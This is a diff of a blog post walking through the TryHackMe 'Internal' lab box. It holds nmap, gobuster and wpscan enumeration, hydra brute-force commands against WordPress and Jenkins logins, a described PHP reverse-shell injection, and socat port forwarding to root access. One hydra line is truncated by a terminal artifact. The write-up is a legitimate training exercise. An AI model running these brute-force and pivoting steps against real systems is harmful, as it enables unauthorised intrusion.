@@ -10,14 +10,14 @@ tags: [Tryhackme , tunneling , jenkins , wp]
 excerpt_separator: <!--more-->
 ---
 
-<img src="/assets/img/thm/internal/title.png" width="417" height="136"><br>
+<img src="/assets/img/thm/internal/title.png" rect width="16" height="16" fill="#58A9D7" ><br>
 Difficulty: Hard
 
 # Intro
 Namaste everyone. This is my first [writeup](http://writeup.So).  So if there are any mistakes please feel free to reach out to me. Also thanks to TheMayor for creating this box. As a begineer into ctfs i really enjoyed solving this box.
 
 Before we get started i wanna shed some light into the type of box we are dealing and short description of the attack. To get the userflag you need to exploit the wordpress site running at the specific directory. For root, you need to enumerate, find the local jenkins server bruteforce it and get a shell where you can get info for creds to ssh into root user.
-
+<!--more-->
 ***
 
 # Scanning and Enumeration
@@ -25,12 +25,12 @@ Before we get started i wanna shed some light into the type of box we are dealin
 Before getting started put `internal.thm` in your `/etc/hosts` 
 
 After the box is deployed lets scan the ip to see open ports
-```console
+```bash
 nmap -sC -sV -T4 -p- -v -oN nmap/fullscan internal.thm
 
 ```
 Here are the open ports:
-```console
+```bash
 Nmap scan report for internal.thm (10.10.119.154)
 Host is up (0.43s latency).
 Not shown: 65533 closed ports
@@ -50,10 +50,12 @@ The box has http and ssh server open.Let's enumerate port 80 first
 ## - Port 80
 
 Looking at the site its a default apache page
+
 <a href="/assets/img/thm/internal/apache.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/apache.png"></a>
 
 Nothing interesting came up so i resorted to my directory bruteforcing. Let's fireup our gobuster to see the directories of the site
-```console
+
+```bash
 gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobust
 ```
 <a href="/assets/img/thm/internal/gobuster.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/gobuster.png"></a>
@@ -64,7 +66,8 @@ There's a blog directory so lets see what it contains
 Its a wordpress website. I looked into the site and there's a classic hello world page. The first thing that came into mind is to run wpscan to see if there is any vulnerabilites of this wordpress site and enumerate the wordpress site. Its a great tool.
 
 It comes preinstalled if you are using kali otherwise you can clone it from [github](https://github.com/wpscanteam/wpscan)
-```console
+
+```bash
 wpscan --url internal.thm/blog -e -v
 ```
 `-e` means enumerate everything
@@ -73,7 +76,8 @@ Use `-h` for help
 
 <a href="/assets/img/thm/internal/wpusers.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wpusers.png"></a>
 Looking at the results the Wordpress version is `5.4.2`  and it found one user admin. We know the username. At this moment i only had a username so lets bruteforce with hydra.
-```console
+
+```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -V -f http-form-post '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fi[32/32$
 .thm%2Fblog%2Fwp-admin%2F&testcookie=1:S=Location
 ```
@@ -95,7 +99,7 @@ Update file and browse the following URL to run the injected php code.
 <a href="/assets/img/thm/internal/wpreverse.png" target="_blank"><img class="centerImgLarge" src="/assets/img/thm/internal/wpreverse.png"></a>
 Once inside at first i did'nt looked at all the folders properly. Further looking inside there's a file in the `/opt`  named `wp-save.txt`
 
-```console
+```bash
 www-data@internal:/opt$ ls -la
 total 16
 drwxr-xr-x  3 root root 4096 Aug  3 03:01 .
@@ -119,13 +123,13 @@ www-data@internal:/opt$
 
 We have two usernames `bill` and `aubreanna` . When we were doing nmap there was a ssh port open. The creds is the ssh details for `aubreanna`
 
-```console
+```bash
 ssh aubreanna@internal.thm
 ```
 
 There you go. There's a user.txt file which contains the first flag
 
-```console
+```bash
 aubreanna@internal:~$ ls
 jenkins.txt  snap  user.txt
 ```
@@ -133,7 +137,7 @@ jenkins.txt  snap  user.txt
 
 After enumerating this box i found that it has a internal port 8080 open. it didnt pop out in our nmap scan becuase it can be accessed only by localhost. We need to pivot to reach to that port.
 
-```console
+```bash
 aubreanna@internal:~$ netstat -ntl
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State      
@@ -155,13 +159,13 @@ Create a `http-server` in your attacker machine and use `wget` to get the binary
 
 Change the permission to executable 
 
-```console
+```bash
 chmod +x socat
 ```
 
 Let's port forward
 
-```console
+```bash
 ./socat tcp-listen:8000,reuseaddr,fork tcp:localhost:8080
 ```
 
@@ -173,7 +177,7 @@ It's a jenkins server which is used to integrate and automate your product devel
 
 The default username for jenkins is `admin` . If it won't work out then we do have other usernames `aubreanna`, `bill` to try . For now let's try with `admin`
 
-```console
+```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -s 8000 -f -V  http-post-form "/j_acegi_security_check:j_usern
 ame=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:S=logout"
 ```
@@ -226,7 +230,7 @@ root:[REDACTED]
 
 Let's ssh into root 
 
-```console
+```bash
 ssh root@internal.thm
 ```
 
@@ -257,19 +261,11 @@ Thanks for reading folks! I really enjoyed this box as it required manual enumer
 
 
 
-{% include aligner.html images="thm/anonymous/anonymous.png" column=1 %}
 
-I want to test what excerpt does. It is enabled after this
-<!--more--> //yeha sama dekaune recha site ma ok!
+ 
 
-## How does it work ?
 
-```yml
 
----
-layout: post
-color: brown
----
-```
+
 
 
